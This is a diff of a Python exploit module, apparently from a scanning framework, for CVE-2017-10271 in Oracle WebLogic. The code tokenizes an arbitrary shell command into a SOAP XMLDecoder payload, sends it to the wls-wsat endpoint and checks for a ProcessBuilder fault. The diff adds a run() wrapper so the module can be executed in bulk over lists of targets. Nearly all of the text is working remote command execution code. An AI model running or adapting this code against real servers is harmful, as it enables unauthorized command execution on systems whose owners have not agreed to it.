@@ -5,8 +5,10 @@
 # updated 2019/10/30
 # by 0xn0ne
 
-from stars import universe, Star, target_type
+from stars import target_type, Star
 from utils import http
+from multiprocessing.managers import SyncManager
+from typing import Any, Dict, List, Mapping, Tuple, Union
 
 headers = {
     'Content-Type': 'text/xml;charset=UTF-8',
@@ -14,7 +16,7 @@ headers = {
 }
 
 
-@universe.groups()
+# @universe.groups()
 class CVE_2017_10271(Star):
     info = {
         'NAME': '',
@@ -27,7 +29,8 @@ class CVE_2017_10271(Star):
         url = 'http://{}:{}/wls-wsat/CoordinatorPortType'.format(dip, dport)
         t_data = ''
         for i, c in enumerate(cmd.split()):
-            t_data += '<void index="{}"><string>{}</string></void>'.format(i, c)
+            t_data += '<void index="{}"><string>{}</string></void>'.format(
+                i, c)
         data = '''
     <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
       <soapenv:Header>
@@ -45,7 +48,23 @@ class CVE_2017_10271(Star):
       <soapenv:Body/>
     </soapenv:Envelope>
     '''.format(t_data)
-        res, data = http(url, 'POST', data=data, timeout=3, headers=headers, ssl=force_ssl)
+        res, data = http(url, 'POST', data=data, timeout=3,
+                         headers=headers, ssl=force_ssl)
         if res != None and ('<faultstring>java.lang.ProcessBuilder' in res.text or "<faultstring>0" in res.text):
             return True, {'msg': 'finish.'}
         return False, {'msg': 'finish.'}
+
+
+def run(queue: SyncManager.Queue, data: Dict):
+    obj = CVE_2017_10271()
+    result = {
+        'IP': data['IP'],
+        'PORT': data['PORT'],
+        'NAME': obj.info['CVE'] if obj.info['CVE'] else obj.info['NAME'],
+        'MSG': '',
+        'STATE': False
+    }
+    result['STATE'], result['MSG'] = obj.light_and_msg(
+        data['IP'], data['PORT'], data['IS_SSL'])
+
+    queue.put(result)
